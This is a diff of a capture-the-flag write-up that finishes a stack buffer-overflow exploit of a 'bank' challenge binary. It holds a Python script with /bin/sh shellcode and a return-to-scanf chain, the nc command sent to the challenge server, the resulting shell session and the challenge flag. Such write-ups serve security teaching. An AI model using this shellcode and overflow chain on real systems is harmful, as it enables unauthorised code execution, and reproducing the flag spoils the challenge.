@@ -965,15 +965,8 @@ With these three pieces, it is possible to craft a payload to write to the vulne
 
 ### 10. Jump to Scanf (Exploit Version 3)
 
-All that is left to do is create the payload with the three `scanf` components and exploit.
+All that is left to do is create the payload with the three `scanf` components and exploit. For the return address, `scanf` should return to the location of the payload, which will be at `0x0804c000`. For the format string, the payload can use the same address that `scanf` uses for the `captcha` function, which is at `0x0804a0f7`. The write location will be the vulnerable location of memory at `0x0804c000`, which is the same as the return address. Add these components to the [exploit script](exploit3.py):
 
-### STOPPED HERE
-First get the address of scanf, which we already have a breakpoint for:
-```
-0x08049080  __isoc99_scanf@plt
-```
-
-[script](exploit3.py)
 ```python
 #!/usr/bin/python3
 import struct
@@ -985,9 +978,9 @@ sub = b'\x2c\xf4'
 shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2'
 shellcode += mov + sub + b'\xcd\x80\x31\xc0\x40\xcd\x80'
 
-scanf = struct.pack("I", 0x08049080)
-percentS = struct.pack("I", 0x0804a0f7)
-payloadAddress = struct.pack("I", 0x0804c000)
+scanf = struct.pack("I", 0x08049080)            # scanf function call address
+percentS = struct.pack("I", 0x0804a0f7)         # %s
+payloadAddress = struct.pack("I", 0x0804c000)   # payload or return address
 
 payload = b'1 ' + b'A' * 1012 + b'BBBB' + scanf + payloadAddress + percentS + payloadAddress + b' ' + shellcode
 
@@ -995,17 +988,62 @@ with open("payload", "wb") as handle:
     handle.write(payload)
 ```
 
-This is it. Run the payload in gdb. It works. Run it without gdb; don't forget to chain cat so that u can control the shell:
+The `payload` can be broken into three pieces:
+```
+1.  b'1 ' 
+2.  b'A' * 1012 + b'BBBB' + scanf + payloadAddress + percentS + payloadAddress + b' '
+3.  shellcode
+```
+
+Payload part 1 selects the `withdraw` function. `scanf` scans the `1` and stops at the space. Then the program continues. 
+
+Part 2 overflows the `userCaptcha` buffer and sets the return address to `scanf`'s location, along with the variables that `scanf` expects (return address, format string, and write location). Part 2 is also followed by a space to stop the scan. The program again continues to the `scanf` function as intended. 
+
+Now `scanf` will scan in part 3, the shellcode, and write it to the `payloadAddress`. Once it is done, it returns to this same address and starts executing the shell instructions.
+
+This is it. Run the payload in gdb. It works! Run it without gdb; remember to chain a cat command so that the shell can continue to receive input:
+
 ```
 $ (cat payload; cat) | ./bank
 ``` 
 
 Now run it on the challenge server:
+
 ```
 $ (cat payload; cat) | nc challenges.laptophackingcoffee.org 2168
+Welcome to the Best Bank!
+Current balance: $500
+
+Options:
+[1] Withdraw
+[2] Deposit
+[3] Check Balance
+[4] Exit
+Enter your choice:  _    _____    _____ _       _          _  __
+| |__|___ / __|_   _| |__   / \   _ __ | |/ /
+| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
+| |_) |__) \__ \| | | |_) / ___ \| | | | . \
+|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\
+
+Captcha: Incorrect!
+
+
+ls
+Makefile
+bank
+bank.c
+bin
+dev
+flag.txt
+lib
+lib32
+lib64
+cat flag.txt
+LHC{b3st_b4nk_h4s_b33n_pwned-120927!!!}
 ```
 
 Submit the flag:
+
 ```
 LHC{b3st_b4nk_h4s_b33n_pwned-120927!!!}
 ```
